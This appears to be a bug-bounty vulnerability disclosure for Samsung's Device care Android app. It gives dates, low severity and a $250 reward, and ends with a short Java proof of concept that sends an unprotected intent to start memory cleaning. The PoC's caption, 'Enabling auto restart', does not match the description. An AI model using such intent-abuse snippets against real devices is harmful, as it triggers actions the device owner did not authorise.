# Details

<table>
    <tr>
        <td>Name</td>
        <td>Device care</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.lool</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

The Device care app handles action `com.samsung.android.sm.ACTION_RAM`. If the attacker passes the `memory optimize` parameter set to `true`, the app will start automatic memory cleaning.

**Proof of Concept**

Enabling auto restart:
```java
Intent i = new Intent("com.samsung.android.sm.ACTION_RAM");
i.putExtra("memory optimize", true);
startActivity(i);
```
